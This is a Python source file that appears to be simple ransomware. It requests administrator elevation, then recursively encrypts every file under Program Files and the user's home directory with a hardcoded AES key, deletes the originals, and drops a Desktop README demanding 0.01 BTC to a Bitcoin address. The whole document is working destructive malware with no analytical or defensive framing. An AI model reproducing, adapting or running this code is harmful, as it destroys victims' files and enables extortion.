import pyAesCrypt
import os
import ctypes
import sys
from pathlib import Path

#Get Admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

#Notification
def notification_note():
	note = '''README, Hi,I'm Randi,You are f**ked,Please pay 0.01 BTC to 1BNesVNa4EaMhxS56FFqD85xxkNFv7GB2v to get the key and how to decrypt your files'''
	desktop_directory = str(Path.home())
	outputfile = desktop_directory + "\\Desktop\\README.txt"
	handler = open(outputfile, 'w')
	handler.write(note)
	handler.close()

def start_ransomware():
	key = "614E635266556A586E3272357538782F413F4428472B4B6250655367566B5970"
	bufferSize = 64 * 1024
	pf = os.environ.get('PROGRAMFILES')
	desktop_directory = str(Path.home())
	for root, dirs, files in os.walk(pf):
		for filename in files:
			pyAesCrypt.encryptFile(root + "\\" +filename , root + "\\" +filename + ".randsomware", key, bufferSize)
			os.remove(root + "\\" + filename)
	for root, dirs, files in os.walk(desktop_directory):
		for filename in files:
			pyAesCrypt.encryptFile(root + "\\" +filename , root + "\\" +filename + ".randsomware", key, bufferSize)
			os.remove(root + "\\" + filename)
	notification_note()

def start():
	is_admin()
	if is_admin():
		start_ransomware()
	else:
		# Re-run the program with admin rights
		ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
		is_admin()
		start_ransomware()

start()